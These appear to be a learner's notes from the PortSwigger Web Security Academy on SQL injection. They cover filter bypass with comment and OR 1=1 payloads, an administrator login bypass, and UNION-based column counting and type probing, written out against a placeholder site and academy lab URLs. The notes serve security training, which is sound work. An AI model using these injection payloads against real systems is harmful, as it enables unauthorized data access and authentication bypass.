# Portswigger Academy

These are notes that I compiled while learning from the Portswigger academy. The code is from them, although I will modify them according to my needs.

## SQL Injection

### **Retrieving hidden data**

Regular:&#x20;

`https://insecure-website.com/products?category=Gifts`

Modified:

`https://insecure-website.com/products?category=Gifts'--`

**OR**

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

### **Subverting application logic**

Regular:

`SELECT * FROM users WHERE username = 'John' AND password = 'Doe'`

Modified:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

### **SQL injection UNION attacks**

For a `UNION` query to work, two key requirements must be met:

* The individual queries must return the same number of columns.
* The data types in each column must be compatible between the individual queries.

To determine the number of columns required (to be submitted within the `WHERE` clause of the original query):

`' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- .....`

**OR**

`' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL--`

If you get an error for either one and then you'll know how many columns there are.

Regular:

`https://acad1f5f1ebf0bbfc0bd07d0009f009f.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories`

Modified:

`https://acad1f5f1ebf0bbfc0bd07d0009f009f.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20NULL,NULL,NULL--`

### **Finding columns with a useful data type in an SQL injection UNION attack**

**Replace 'a' with string you are looking for**

`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`

Regular:

`https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories`

Modified:

`https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,%27FgYUb0%27,NULL--`









